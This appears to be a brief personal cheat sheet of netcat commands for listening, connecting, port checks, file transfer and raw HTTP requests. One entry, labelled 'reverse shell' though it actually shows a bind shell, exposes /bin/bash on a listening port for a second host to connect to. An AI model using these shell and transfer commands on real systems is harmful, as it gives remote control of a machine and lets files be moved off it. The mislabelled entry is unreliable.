* `nc -l port` listen for inbound connection on a port
* `nc 10.0.2.10 port` connect to remote host and port
* `nc -u ...` on UDP rather than TCP (which is default)
* `nc -w 10` terminate connection after 10 seconds
* `nc -z` report connection status only (can be used to test port open)
  * commonly used together with `-v`
  * e.g `nc -vz 10.0.2.10 8080`
* `nc -c command`
* `nc -e command`
* reverse shell
  * on host1: `nc -n -v -l -p 5555 -e /bin/bash`
  * on host2: `nc -nv host1 5555`
* transfer a file
  * on host1: `nc -l -p 8080 > out.file`
  * on host2: `nc host1 8080 < in.file`
* curl
  * `printf "GET / HTTP/1.0\r\n\r\n" | nc site-hostname 80`
